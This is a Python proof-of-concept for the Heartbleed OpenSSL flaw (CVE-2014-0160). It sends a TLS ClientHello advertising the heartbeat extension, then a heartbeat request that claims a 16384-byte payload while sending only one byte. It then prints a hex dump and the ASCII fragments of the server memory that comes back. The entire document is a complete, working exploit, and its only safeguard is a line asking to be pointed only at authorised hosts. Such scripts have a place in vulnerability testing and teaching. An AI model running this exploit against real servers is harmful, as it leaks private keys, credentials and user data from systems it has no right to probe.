#!/usr/bin/env python3
"""
Heartbleed (CVE-2014-0160) proof-of-concept.
Sends a real TLS ClientHello (advertising the heartbeat extension), then a
heartbeat request that LIES about its payload length (claims far more bytes
than were actually sent). A patched OpenSSL rejects this; a vulnerable one
echoes back its own heap memory to pad out the lie -- that's the leak.
Only ever point this at a host you own / are authorized to test.
"""
import socket
import struct
import sys
import binascii

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 18443

def tls_record(content_type, payload, version=b"\x03\x01"):
    return bytes([content_type]) + version + struct.pack(">H", len(payload)) + payload

def build_client_hello():
    version = b"\x03\x01"
    random_bytes = b"\x11" * 32
    session_id = b"\x00"
    cipher_suites = b"\x00\x02\x00\x2f"          # 1 suite: TLS_RSA_WITH_AES_128_CBC_SHA
    compression = b"\x01\x00"                     # 1 method: null
    heartbeat_ext = b"\x00\x0f\x00\x01\x01"        # ext_type=heartbeat, len=1, mode=peer_allowed
    ext_reneg = b"\xff\x01\x00\x01\x00"            # renegotiation_info, empty
    extensions = heartbeat_ext + ext_reneg
    ext_block = struct.pack(">H", len(extensions)) + extensions
    body = version + random_bytes + session_id + cipher_suites + compression + ext_block
    handshake = b"\x01" + struct.pack(">I", len(body))[1:] + body   # HandshakeType=1 ClientHello
    return tls_record(0x16, handshake)

def build_heartbleed_probe(claimed_len=16384, actual_payload=b"A"):
    hb_body = b"\x01" + struct.pack(">H", claimed_len) + actual_payload  # type=request(1)
    return tls_record(0x18, hb_body)

def recv_all(sock, timeout=6):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def main():
    print(f"[+] connecting to {HOST}:{PORT}")
    s = socket.create_connection((HOST, PORT), timeout=8)

    print("[+] sending ClientHello (advertising heartbeat extension)")
    s.sendall(build_client_hello())
    server_hello = recv_all(s, timeout=4)
    print(f"[+] server handshake response: {len(server_hello)} bytes received")

    print("[+] sending malicious heartbeat: claims 16384-byte payload, actually sends 1 byte")
    s.sendall(build_heartbleed_probe())

    resp = recv_all(s, timeout=6)
    s.close()

    if not resp:
        print("[-] no response to heartbeat -- server likely patched (rejects oversized claim) or heartbeat disabled")
        return

    # find a heartbeat response record (content type 0x18) in whatever we got back
    i = 0
    leaked = b""
    while i + 5 <= len(resp):
        ctype = resp[i]
        rlen = struct.unpack(">H", resp[i+3:i+5])[0]
        body = resp[i+5:i+5+rlen]
        if ctype == 0x18 and len(body) > 3:
            hb_type = body[0]
            hb_len = struct.unpack(">H", body[1:3])[0]
            payload = body[3:3+hb_len]
            print(f"[!] HEARTBEAT RESPONSE record: declared payload_length={hb_len}, actually received={len(payload)} bytes")
            leaked = payload
            break
        i += 5 + rlen

    if not leaked:
        print("[-] no heartbeat response record found -- server did not leak (patched)")
        return

    print(f"\n[!!!] VULNERABLE -- server returned {len(leaked)} bytes, we only sent 1.")
    print(f"[!!!] That's {len(leaked)-1} bytes of the server process's OWN MEMORY, leaked over the wire.\n")
    print("--- hex dump of leaked memory (first 512 bytes) ---")
    chunk = leaked[:512]
    for off in range(0, len(chunk), 16):
        row = chunk[off:off+16]
        hexpart = " ".join(f"{b:02x}" for b in row)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in row)
        print(f"{off:04x}  {hexpart:<48}  {ascii_part}")

    printable = bytes(b for b in leaked if 32 <= b < 127)
    print(f"\n--- printable ASCII fragments extracted from the leak ({len(printable)} chars) ---")
    print(printable.decode("ascii", errors="ignore"))

if __name__ == "__main__":
    main()
